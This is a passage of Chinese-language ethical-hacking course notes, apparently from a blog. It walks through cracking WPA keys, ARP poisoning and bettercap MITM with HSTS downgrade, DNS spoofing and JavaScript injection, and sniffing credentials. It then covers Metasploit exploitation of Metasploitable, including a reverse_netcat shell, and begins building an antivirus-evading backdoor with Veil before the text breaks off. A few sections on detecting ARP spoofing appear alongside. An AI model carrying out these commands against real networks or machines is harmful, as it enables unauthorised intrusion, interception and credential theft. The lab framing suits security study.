wlan0<br>終端C:等待詢問是否用此數據包(y)，試圖確定PRG，有可能失敗<br>終端C:取得密鑰流檔案.xor<br>終端C:使用以下兩命令製作及注入封包:<br><img src="/photo/Ethical_Hacking/6.jpg" alt="6"></p></blockquote></blockquote><h3 id="WPA破解-啟用WPS且PBC沒啟用"><a href="#WPA破解-啟用WPS且PBC沒啟用" class="headerlink" title="WPA破解(啟用WPS且PBC沒啟用)"></a><strong>WPA破解(啟用WPS且PBC沒啟用)</strong></h3><h4 id="查看是否啟用WPS"><a href="#查看是否啟用WPS" class="headerlink" title="查看是否啟用WPS"></a><strong>查看是否啟用WPS</strong></h4><blockquote><p>指令 : wash –interface wlan0</p></blockquote><h4 id="破解WPS"><a href="#破解WPS" class="headerlink" title="破解WPS"></a><strong>破解WPS</strong></h4><blockquote><p>執行以下兩個終端機<br><img src="/photo/Ethical_Hacking/7.jpg" alt="7"></p></blockquote><h3 id="WPA破解-禁用WPS或PBC啟用"><a href="#WPA破解-禁用WPS或PBC啟用" class="headerlink" title="WPA破解(禁用WPS或PBC啟用)"></a><strong>WPA破解(禁用WPS或PBC啟用)</strong></h3><h4 id="取得握手包"><a href="#取得握手包" class="headerlink" title="取得握手包"></a><strong>取得握手包</strong></h4><blockquote><p>說明:監聽直到出現以下圖片右上文字<br>終端A指令: airodump-ng –bssid 目標MAC –channel 目標頻道 –write 檔案名 wlan0<br>終端B指令(加速): aireplay-ng –deauth 攻擊次數 -a 目標網路MAC -c 目標客戶機MAC wlan0<br><img src="/photo/Ethical_Hacking/8.jpg" alt="8"></p></blockquote><h4 id="創建字典"><a href="#創建字典" class="headerlink" title="創建字典"></a><strong>創建字典</strong></h4><blockquote><p>說明:使用Crunch創建密碼字典<br><img src="/photo/Ethical_Hacking/9.jpg" alt="9"><br>單字列表參考網址:<br><a href="ftp://ftp.openwall.com/pub/wordlists/">ftp://ftp.openwall.com/pub/wordlists/</a><br><a href="http://www.openwall.com/mirrors/">openwall.com&#x2F;mirrors&#x2F;</a><br><a href="http://gdataonline.com/downloads/GDict/">gdataonline.com&#x2F;downloads&#x2F;GDict&#x2F;</a><br><a href="http://www.outpost9.com/files/WordLists.html">outpost9.com&#x2F;files&#x2F;WordLists.html</a><br><a href="http://www.vulnerabilityassessment.co.uk/passwords.htm">vulnerabilityassessment.co.uk&#x2F;passwords.htm</a><br><a href="http://packetstormsecurity.org/Crackers/wordlists/">packetstormsecurity.org&#x2F;Crackers&#x2F;wordlists&#x2F;</a><br><a href="http://www.ai.uga.edu/ftplib/natural-language/moby/">ai.uga.edu&#x2F;ftplib&#x2F;natural-language&#x2F;moby&#x2F;</a><br><a href="http://www.cotse.com/tools/wordlists1.htm">cotse.com&#x2F;tools&#x2F;wordlists1.htm</a><br><a href="http://www.cotse.com/tools/wordlists2.htm">cotse.com&#x2F;tools&#x2F;wordlists2.htm</a><br><a href="http://wordlist.sourceforge.net/">wordlist.sourceforge.net&#x2F;</a></p></blockquote><h4 id="密碼爆破"><a href="#密碼爆破" class="headerlink" title="密碼爆破"></a><strong>密碼爆破</strong></h4><blockquote><p>指令aircrack-ng 檔案名.cap -w 字典路徑</p></blockquote><blockquote><p><strong>note:</strong><br>目前止WPA2破解唯一方式，建議以社交工程騙取密碼</p></blockquote><h3 id="加速WPA破解"><a href="#加速WPA破解" class="headerlink" title="加速WPA破解"></a><strong>加速WPA破解</strong></h3><h4 id="Cracking-the-Key-Quicker-using-a-Rainbow-Table-以空間換時間"><a href="#Cracking-the-Key-Quicker-using-a-Rainbow-Table-以空間換時間" class="headerlink" title="Cracking the Key Quicker using a Rainbow Table(以空間換時間)"></a><strong>Cracking the Key Quicker using a Rainbow Table(以空間換時間)</strong></h4><blockquote><p>說明 : 先將密碼字典中的密碼加密，以便之後比對<br>創建資料庫 : airolib-ng test-db –import passwd 密碼字典.txt<br>創建破解網路明文件: echo “TOTOLINK_A800R(網路名)” &gt;test-essid<br><img src="/photo/Ethical_Hacking/10.jpg" alt="10"><br>將essid導入 :　airolib-ng test-db –import essid test-essid（文件名）<br>將每個密碼列表與ｅｓｓｉｄ結合計算每個密碼的ＰＭＫ：airolib-ng test-db　–batch　<br>輸入以下指令用資料庫破解:<br><img src="/photo/Ethical_Hacking/11.jpg" alt="11"></p></blockquote><h4 id="Cracking-WPA-WPA2-Much-Faster-Using-GPU-使用GUI破解"><a href="#Cracking-WPA-WPA2-Much-Faster-Using-GPU-使用GUI破解" class="headerlink" title="Cracking WPA&#x2F;WPA2 Much Faster Using GPU(使用GUI破解)"></a><strong>Cracking WPA&#x2F;WPA2 Much Faster Using GPU(使用GUI破解)</strong></h4><blockquote><p>下載驅動GUI(windown)<br><a href="https://hashcat.net/hashcat/">hashcat.net&#x2F;hashcat&#x2F;</a><br><img src="/photo/Ethical_Hacking/12.jpg" alt="12"><br>下載hashcat二進制文件<br><img src="/photo/Ethical_Hacking/13.jpg" alt="13"><br>將cap握手包轉成hashcat支援的格式:<br><a href="https://hashcat.net/cap2hashcat/">hashcat.net&#x2F;cap2hashcat&#x2F;</a><br><img src="/photo/Ethical_Hacking/14.jpg" alt="14"><br>把下圖兩文件丟到hashcat資料夾裡<br><img src="/photo/Ethical_Hacking/15.jpg" alt="15"><br>cmd到hashcat目錄執行<br>執行hashcat64.exe -I 查看可用GPU<br><img src="/photo/Ethical_Hacking/16.jpg" alt="16"><br>執行以下命令:<br><img src="/photo/Ethical_Hacking/17.jpg" alt="17"></p></blockquote><blockquote><p><strong>note:</strong></p><ol><li>-m 數字 : 代表加密類型</li><li>-d 數字 : 使用哪個GUI</li></ol></blockquote><h2 id="連接後攻擊"><a href="#連接後攻擊" class="headerlink" title="連接後攻擊"></a><strong>連接後攻擊</strong></h2><h3 id="Post-Connection-Attacks"><a href="#Post-Connection-Attacks" class="headerlink" title="Post Connection Attacks"></a><strong>Post Connection Attacks</strong></h3><h4 id="Installing-Windows-As-a-Virtual-machine"><a href="#Installing-Windows-As-a-Virtual-machine" class="headerlink" title="Installing Windows As a Virtual machine"></a><strong>Installing Windows As a Virtual machine</strong></h4><blockquote><p>網址:<a href="https://ln5.sync.com/dl/69a8cb2b0/k2xyv9ke-qevy6hgz-tavwxu3c-78858267/view/default/11829848200004">windows模擬機下載</a></p></blockquote><h3 id="Post-Connection-Attacks-資料蒐集"><a href="#Post-Connection-Attacks-資料蒐集" class="headerlink" title="Post Connection Attacks-資料蒐集"></a><strong>Post Connection Attacks-資料蒐集</strong></h3><h4 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a><strong>netdiscover</strong></h4><blockquote><p>指令 : netdiscover -r 192.168.17.1&#x2F;24</p></blockquote><blockquote><p><strong>note :</strong> </p><ol><li>只能找尋目前所在子網域的主機</li><li>如果用無線網路試配器，要在虛擬機取消網路連線<br><img src="/photo/Ethical_Hacking/18.jpg" alt="18"></li></ol></blockquote><h4 id="GUI-Nmap"><a href="#GUI-Nmap" class="headerlink" title="GUI Nmap"></a><strong>GUI Nmap</strong></h4><blockquote><p>指令 : zenmap</p></blockquote><h3 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a><strong>MITM</strong></h3><h4 id="ARP-Poisoning-Using-arpspoof"><a href="#ARP-Poisoning-Using-arpspoof" class="headerlink" title="ARP Poisoning Using arpspoof"></a><strong>ARP Poisoning Using arpspoof</strong></h4><blockquote><p>查看window跟kali的網路介面 : arp -a<br>指令 : arpspoof -i eth0 -t  目標機器MAC 受欺騙機器MAC<br><img src="/photo/Ethical_Hacking/19.jpg" alt="19"></p></blockquote><blockquote><p><strong>note:</strong></p><ol><li>終端A:欺騙192.168.17.131(目標)，我是192.168.17.2(路由器)</li><li>終端B:欺騙192.168.17.2(路由器)，我是192.168.17.131(目標)</li><li>終端C:查詢kali的arp表格</li></ol></blockquote><blockquote><p>指令 : echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward</p></blockquote><blockquote><p><strong>note:</strong><br>这条命令的含义是将数字 1 写入 &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward 文件中。</p><p>在 Linux 系统中，&#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward 是一个特殊的文件，用于控制 IP 转发功能。IP 转发是指将收到的 IP 数据包从一个网络接口转发到另一个网络接口的功能。</p><p>当将数字 1 写入 &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;ip_forward 文件时，表示启用了 IP 转发功能。这意味着 Linux 系统将允许接收到的 IP 数据包在不同的网络接口之间进行转发，而不仅仅是将数据包发送到本地系统。</p><p>通常情况下，启用 IP 转发功能是在路由器或者具有网络转发功能的计算机上使用，以便它们可以转发数据包来连接不同的网络。<br>只是暫時，重開機後失效<br>linux一般禁止ip轉接</p></blockquote><h4 id="ARP-Poisoning-Using-bettercap"><a href="#ARP-Poisoning-Using-bettercap" class="headerlink" title="ARP Poisoning Using bettercap"></a><strong>ARP Poisoning Using bettercap</strong></h4><blockquote><p><strong>bettercap基本介紹</strong><br>指令 : bettercap -iface eth0(介面)<br>查看運行模組 : help<br><img src="/photo/Ethical_Hacking/20.jpg" alt="20"><br>查看運行模組詳細 : help net.probe(模組名)<br>開啟網路點探測器 : net.probe on<br><img src="/photo/Ethical_Hacking/21.jpg" alt="21"><br>如上圖 : net.recon網路偵測也會自動開啟<br>查看偵測到的裝置列表 : net.show<br><img src="/photo/Ethical_Hacking/22.jpg" alt="22"></p></blockquote><blockquote><p><strong>bettercap arp欺騙模組</strong><br>查看arp欺騙模組 : help arp.spoof<br><img src="/photo/Ethical_Hacking/23.jpg" alt="23"><br>將arp.spoof.fullduplex設置為true: set arp.spoof.fullduplex true<br>設定目標: set arp.spoof.targets 192.168.17.131(目標ip)<br>開啟模組:arp.spoof on<br><img src="/photo/Ethical_Hacking/24.jpg" alt="24"></p></blockquote><blockquote><p><strong>note :</strong> </p><ol><li>若arp.spoof.fullduplex設置為true : 可欺騙路由器和目標</li><li>若arp.spoof.fullduplex設置為flase : 只欺騙目標</li></ol></blockquote><blockquote><p><strong>分析模組</strong><br>指令: net.sniff on</p><ul><li>舉例:<br>在windows的覽器開啟網頁:<a href="http://vulnweb.com/">http://vulnweb.com/</a><br><img src="/photo/Ethical_Hacking/25.jpg" alt="25"><br><img src="/photo/Ethical_Hacking/26.jpg" alt="26"><br>如上圖: 可攔截未經加密的封包</li></ul></blockquote><h4 id="bettercap快速設定"><a href="#bettercap快速設定" class="headerlink" title="bettercap快速設定"></a><strong>bettercap快速設定</strong></h4><blockquote><p>創建一個文本並寫入要執行的指令且儲存:<br><img src="/photo/Ethical_Hacking/27.jpg" alt="27"><br>啟動: bettercap -iface eth0 -caplet spoof.cap(檔案名)</p></blockquote><h3 id="bettercap-HTTPS解決"><a href="#bettercap-HTTPS解決" class="headerlink" title="bettercap HTTPS解決"></a><strong>bettercap HTTPS解決</strong></h3><h4 id="方法一-對HSTS無效"><a href="#方法一-對HSTS無效" class="headerlink" title="方法一(對HSTS無效)"></a><strong>方法一(對HSTS無效)</strong></h4><blockquote><p>修改文檔使其嗅探所有數據<br><img src="/photo/Ethical_Hacking/28.jpg" alt="28"><br>查看外加腳本:caplets.show<br><img src="/photo/Ethical_Hacking/29.jpg" alt="29"><br>運行 : hstshijack&#x2F;hstshijack<br><img src="/photo/Ethical_Hacking/30.jpg" alt="30"><br>成功使網路降級:<br><img src="/photo/Ethical_Hacking/31.jpg" alt="31"></p></blockquote><h4 id="方法二-繞過HSTS"><a href="#方法二-繞過HSTS" class="headerlink" title="方法二(繞過HSTS)"></a><strong>方法二(繞過HSTS)</strong></h4><blockquote><p>說明:使瀏覽器誤以為在加載別的網頁<br>修改hstshijack，將想替換的網域跟替換成甚麼的網域加上<br><img src="/photo/Ethical_Hacking/32.jpg" alt="32"><br>進入瀏覽器:google.ie<br><img src="/photo/Ethical_Hacking/33.jpg" alt="33"><br>搜尋facebook:<br><img src="/photo/Ethical_Hacking/34.jpg" alt="34"><br>即可完成<br><img src="/photo/Ethical_Hacking/35.jpg" alt="35"></p></blockquote><blockquote><p><strong>統整</strong><br><img src="/photo/Ethical_Hacking/36.jpg" alt="36"></p></blockquote><h3 id="DNS-Spoofing-Controlling-DNS-Requests-on-The-Network"><a href="#DNS-Spoofing-Controlling-DNS-Requests-on-The-Network" class="headerlink" title="DNS Spoofing - Controlling DNS Requests on The Network"></a><strong>DNS Spoofing - Controlling DNS Requests on The Network</strong></h3><h4 id="啟動kali中的伺服器"><a href="#啟動kali中的伺服器" class="headerlink" title="啟動kali中的伺服器"></a><strong>啟動kali中的伺服器</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2(伺服器名稱) start</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/37.jpg" alt="37"></p><blockquote><p>網頁默認存在: var&#x2F;www&#x2F;html</p></blockquote><h4 id="DNS欺騙-對HSTS無效"><a href="#DNS欺騙-對HSTS無效" class="headerlink" title="DNS欺騙(對HSTS無效)"></a><strong>DNS欺騙(對HSTS無效)</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bettercap -iface eth0 -caplet spoof.cap</span><br><span class="line">help dns.spoof</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/38.jpg" alt="38"></p><blockquote><p><strong>note:</strong></p><ol><li>dns.spoof.address:DNS欺騙地址(預設定向到自己)</li><li>dns.spoof.all:欺騙全部</li><li>dns.spoof.domains:欺騙的網域</li></ol></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set dns.spoof.all true</span><br><span class="line">set dns.spoof.domains zsecurity.org,*.zsecurity.org(網域)</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/39.jpg" alt="39"></p><h4 id="注入js"><a href="#注入js" class="headerlink" title="注入js"></a><strong>注入js</strong></h4><blockquote><p>寫js文檔<br>更改hstshijack.cap在set hstshijack.payloadsr加上你的js文檔<br><img src="/photo/Ethical_Hacking/40.jpg" alt="40"></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bettercap -iface eth0 -caplet spoof.cap</span><br><span class="line">hstshijack/hstshijack</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/41.jpg" alt="41"></p><blockquote><p>注入成功<br><img src="/photo/Ethical_Hacking/42.jpg" alt="42"></p></blockquote><h3 id="bettercap圖形介面"><a href="#bettercap圖形介面" class="headerlink" title="bettercap圖形介面"></a><strong>bettercap圖形介面</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bettercap -iface eth0</span><br><span class="line">http-ui</span><br></pre></td></tr></table></figure><blockquote><p>預設帳號:user<br>預設密碼:pass<br><img src="/photo/Ethical_Hacking/43.jpg" alt="43"></p></blockquote><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a><strong>wireshark</strong></h3><blockquote><p>說明:wireshark只能捕捉自己電腦的流量，但當我們成為中間人時，可用來分析中間人接口的流量及封包</p></blockquote><h4 id="錄製封包"><a href="#錄製封包" class="headerlink" title="錄製封包"></a><strong>錄製封包</strong></h4><blockquote><p>開啟bettercap，並使自己成為中間人<br>打開wireshark<br>選擇網路介面，開始錄製<br><img src="/photo/Ethical_Hacking/44.jpg" alt="44"></p></blockquote><h4 id="過濾封包"><a href="#過濾封包" class="headerlink" title="過濾封包"></a><strong>過濾封包</strong></h4><blockquote><p>因為有對目標發動降級攻擊，因此可以在過濾框中輸入http，來過濾封包<br><img src="/photo/Ethical_Hacking/45.jpg" alt="45"><br>上圖:追蹤封包回應的完整訊息<br><img src="/photo/Ethical_Hacking/46.jpg" alt="46"><br>回應了一個網頁html<br>找尋使用者帳號密碼<br><img src="/photo/Ethical_Hacking/47.jpg" alt="47"></p></blockquote><blockquote><p>修改spoof文檔使得在bettercap開啟時，錄製封包，不必開啟wireshark<br><img src="/photo/Ethical_Hacking/48.jpg" alt="48"></p></blockquote><blockquote><p>ctrl+F可在wireshark裡查找捕獲數據包的任何內容<br><img src="/photo/Ethical_Hacking/49.jpg" alt="49"></p></blockquote><h3 id="Creating-a-Fake-Access-Point-Honeypot-Practical"><a href="#Creating-a-Fake-Access-Point-Honeypot-Practical" class="headerlink" title="Creating a Fake Access Point (Honeypot) - Practical"></a><em>Creating a Fake Access Point (Honeypot) - Practical</em></h3><h4 id="確認配置"><a href="#確認配置" class="headerlink" title="確認配置"></a>確認配置</h4><blockquote><ol><li>無限網卡不能為監聽模式</li><li>無線網卡不能連接任何網路</li><li>kali機器有連接網路(eth0)</li></ol></blockquote><h4 id="wifi-hotspot"><a href="#wifi-hotspot" class="headerlink" title="wifi hotspot"></a>wifi hotspot</h4><blockquote><p>啟動wifi hotspot<br>設定wifi<br><img src="/photo/Ethical_Hacking/50.jpg" alt="50"></p></blockquote><h3 id="檢測自己機器是否arp中毒"><a href="#檢測自己機器是否arp中毒" class="headerlink" title="檢測自己機器是否arp中毒"></a><em>檢測自己機器是否arp中毒</em></h3><h4 id="xarp"><a href="#xarp" class="headerlink" title="xarp"></a><strong>xarp</strong></h4><p>下載連結:<a href="https://softfamous.com/xarp/">xarp</a></p><blockquote><p>啟動:xarp<br><img src="/photo/Ethical_Hacking/51.jpg" alt="51"><br>發動arp攻擊時:<br><img src="/photo/Ethical_Hacking/52.jpg" alt="52"><br>因為一個網域裡的每台機器mac位置都不會重複，因此當發動arp攻擊時，會被偵測到</p></blockquote><h4 id="wireshark-1"><a href="#wireshark-1" class="headerlink" title="wireshark"></a><strong>wireshark</strong></h4><blockquote><p>開啟arp檢測<br><img src="/photo/Ethical_Hacking/53.jpg" alt="53"><br><img src="/photo/Ethical_Hacking/54.jpg" alt="54"></p></blockquote><blockquote><p>當有人試圖偵測網路上所有機器時<br><img src="/photo/Ethical_Hacking/55.jpg" alt="55"></p></blockquote><blockquote><p>當arp中毒時<br><img src="/photo/Ethical_Hacking/56.jpg" alt="56"><br>警告我們路由器有2個mac位置</p></blockquote><blockquote><p>預防方法:</p><ol><li>有交換器能幫忙監測arp欺騙</li><li>將arp表的每個ip設為靜態的(缺點:每次變動都必須手動更改)</li></ol></blockquote><blockquote><p>中間人攻擊預防方法:<br>無法管理網路時(大學網路，機場網路或酒店網路等):<br>加密自己的流量(vpn)<br><img src="/photo/Ethical_Hacking/57.jpg" alt="57"></p></blockquote><blockquote><p>統整:<br><img src="/photo/Ethical_Hacking/58.jpg" alt="58"></p></blockquote><h3 id="服務器入侵"><a href="#服務器入侵" class="headerlink" title="服務器入侵"></a><strong>服務器入侵</strong></h3><h4 id="安裝Metasploitable"><a href="#安裝Metasploitable" class="headerlink" title="安裝Metasploitable"></a>安裝Metasploitable</h4><blockquote><p>下載網址:<a href="https://sourceforge.net/projects/metasploitable/">metasploitable</a><br>預設帳號: msfadmin<br>預設密碼: msfadmin</p></blockquote><h4 id="搜集訊息"><a href="#搜集訊息" class="headerlink" title="搜集訊息"></a><strong>搜集訊息</strong></h4><blockquote><p>找尋目標ip: ping URL<br><img src="/photo/Ethical_Hacking/59.jpg" alt="59"><br>利用nmap或zenamp進行掃描<br><img src="/photo/Ethical_Hacking/60.jpg" alt="60"><br>ftp錯誤配置，允許匿名登陸:<br><img src="/photo/Ethical_Hacking/61.jpg" alt="61"><br>去google找尋這ftp是版本是否有漏洞</p></blockquote><p>舉例(錯誤配置):</p><blockquote><p><img src="/photo/Ethical_Hacking/62.jpg" alt="62"><br>去google找尋這程序在做甚麼<br><img src="/photo/Ethical_Hacking/63.jpg" alt="63"><br>由上圖可知 這是一個遠端的登錄程序<br>嘗試查詢如何使用並連接<br><img src="/photo/Ethical_Hacking/64.jpg" alt="64"><br>搜尋資訊<br><img src="/photo/Ethical_Hacking/65.jpg" alt="65"></p></blockquote><blockquote><p>metasploit框架<br>metasploit指令<br><img src="/photo/Ethical_Hacking/66.jpg" alt="66"><br>msfconsole:啟動程序<br>show:顯示一些訊息(可用的漏洞或補助設備，有效負載等)<br>use:使用漏洞運行<br>set:設置利用漏洞的特殊選項</p></blockquote><blockquote><p><img src="/photo/Ethical_Hacking/61.jpg" alt="61"><br>google搜尋vsftpd 2.3.4 exploit<br><img src="/photo/Ethical_Hacking/67.jpg" alt="67"><br>發現一個后門可用metasploit攻擊<br>使用模塊名稱:<br><img src="/photo/Ethical_Hacking/68.jpg" alt="68"></p></blockquote><p>舉例(后門):</p><blockquote><p>用metasploit攻擊<br>終端機輸入</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/unix/ftp/vsftpd_234_backdoor #使用模組</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/69.jpg" alt="69"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show options #針對利用漏洞攻擊的選項</span><br><span class="line">set RHOSTS 192.168.17.133 #設定目標ip</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/70.jpg" alt="70"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit #有時沒發生甚麼，再執行一次</span><br></pre></td></tr></table></figure><blockquote><p>運行成功<br><img src="/photo/Ethical_Hacking/71.jpg" alt="71"></p></blockquote><p><strong>舉例(端口139的Samba smbd 3.X，緩衝益位):</strong></p><blockquote><p>去google發現<br><img src="/photo/Ethical_Hacking/72.jpg" alt="72"><br>這是一個命令執行的漏洞</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/samba/usermap_script #使用模組</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/73.jpg" alt="73"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 192.168.17.133 #設定目標ip</span><br></pre></td></tr></table></figure><blockquote><p>選擇運行的有效負載</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show payloads</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/74.jpg" alt="74"></p><blockquote><p>有兩種主要類型<br>bind payloads:在目標計算機上打開一個端口，然後我們連接到該端口<br>reverse payloads:在我們計算機打開一個端口，讓他連接過來(比較容易繞過防火牆)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set PAYLOAD payload/cmd/unix/reverse_netcat</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show options</span><br><span class="line">set LHOST 192.168.17.132</span><br><span class="line">set LPORT 5555(不一定要設定，隨便端口都可)</span><br><span class="line">show options</span><br></pre></td></tr></table></figure><blockquote><p>設定完成<br><img src="/photo/Ethical_Hacking/75.jpg" alt="75"></p></blockquote><blockquote><p>啟動</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit </span><br></pre></td></tr></table></figure><blockquote><p>連接成功<br><img src="/photo/Ethical_Hacking/76.jpg" alt="76"></p></blockquote><h4 id="nexpose"><a href="#nexpose" class="headerlink" title="nexpose"></a><strong>nexpose</strong></h4><blockquote><p>下載連結: <a href="https://www.rapid7.com/products/nexpose/request-download/">nexpose</a><br>臨時電子郵件:<a href="https://temp-mail.org/">temp-mail.org</a></p></blockquote><blockquote><p>下載完後:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x Rapid7Setup-Linux64.bin</span><br><span class="line">./Rapid7Setup-Linux64.bin</span><br></pre></td></tr></table></figure><blockquote><p>安裝完後關閉nexpose自動啟動程序</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl disable nexposeconsole.service</span><br></pre></td></tr></table></figure><blockquote><p>啟動nexpose</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/rapid7/nexpose/</span><br><span class="line">cd nsc</span><br><span class="line">./nsc.sh #啟動時要非常久，約30分鐘</span><br></pre></td></tr></table></figure><blockquote><p>完成後有一個網址可訪問<br><img src="/photo/Ethical_Hacking/77.jpg" alt="77"><br>登陸之前設定的帳號密碼<br><img src="/photo/Ethical_Hacking/78.jpg" alt="78"><br>登陸後，輸入之前信件裡的密鑰</p></blockquote><blockquote><p>添加目標<br><img src="/photo/Ethical_Hacking/79.jpg" alt="79"><br><img src="/photo/Ethical_Hacking/80.jpg" alt="80"><br><img src="/photo/Ethical_Hacking/81.jpg" alt="81"><br>選擇掃描位置<br><img src="/photo/Ethical_Hacking/82.jpg" alt="82"><br>可選擇設定日志，自動掃描<br><img src="/photo/Ethical_Hacking/83.jpg" alt="83"><br>啟動掃描<br><img src="/photo/Ethical_Hacking/84.jpg" alt="84"></p></blockquote><blockquote><p>掃描完成<br><img src="/photo/Ethical_Hacking/85.jpg" alt="85"><br>發現714個漏洞，可利用攻擊223<br><img src="/photo/Ethical_Hacking/86.jpg" alt="86"><br>機器安裝的軟件(可用來入侵之後的提權等)<br><img src="/photo/Ethical_Hacking/87.jpg" alt="87"><br>目標機器上安裝的服務<br><img src="/photo/Ethical_Hacking/88.jpg" alt="88"><br>危險等級及技能等級分類<br><img src="/photo/Ethical_Hacking/89.jpg" alt="89"><br>詳細列表即可利用的攻擊工具<br><img src="/photo/Ethical_Hacking/90.jpg" alt="90"></p></blockquote><blockquote><p>舉例:<br><img src="/photo/Ethical_Hacking/91.jpg" alt="91"><br>可利用的模組(不一定成功)<br><img src="/photo/Ethical_Hacking/92.jpg" alt="92"><br>特定漏洞的引用<br><img src="/photo/Ethical_Hacking/93.jpg" alt="93"><br>解決方案:<br><img src="/photo/Ethical_Hacking/94.jpg" alt="94"></p></blockquote><blockquote><p>生成報告<br><img src="/photo/Ethical_Hacking/95.jpg" alt="95"><br>Audit Report:給程序員及技術人員的詳細資料<br>第三個:較少訊息的執行報告，給經理或沒有較多技術經驗的人編寫的</p></blockquote><h3 id="客戶端入侵"><a href="#客戶端入侵" class="headerlink" title="客戶端入侵"></a><strong>客戶端入侵</strong></h3><h4 id="veil"><a href="#veil" class="headerlink" title="veil"></a>veil</h4><blockquote><p>下載網址:<a href="https://github.com/Veil-Framework/Veil">Veil-Framework</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd Downloads/</span><br><span class="line">chmod +x install-veil</span><br><span class="line">./install-veil </span><br></pre></td></tr></table></figure><blockquote><p>安裝好後，啟動</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">veil</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Ethical_Hacking/96.jpg" alt="96"><br>exit離開<br>info獲取特定工具訊息<br>list列出可用工具<br>options        顯示veil配置<br>update更新veil<br>use使用特定工具</p></blockquote><blockquote><p>veil有兩個主要工具:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/97.jpg" alt="97"></p><blockquote><p>1Evasion:用來生成不可偵測的后門<br>2Ordnance:用來生成有效負荷的工具(補助工具)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 1</span><br><span class="line">list   #列出可用的有效負載</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/98.jpg" alt="98"></p><blockquote><p>一般命名方式:<br>1.編成語言:將惡意代碼包裝成哪種語言<br>2.有效負載類型:目標計算機執行代碼的類型<br>3.用來連接的方式<br>例如:go&#x2F;meterpreter&#x2F;rev_https.py</p></blockquote><blockquote><p>特殊命名方式:<br>例如:lua&#x2F;shellcode_inject&#x2F;flat.py<br>產生一個正常的有效負載，這正常的有效負載注入一些惡意代碼</p></blockquote><h4 id="製作后門"><a href="#製作后門" class="headerlink" title="製作后門"></a>製作后門</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">veil</span><br><span class="line">use 1</span><br><span class="line">list</span><br><span class="line">use 15</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Ethical_Hacking/99.jpg" 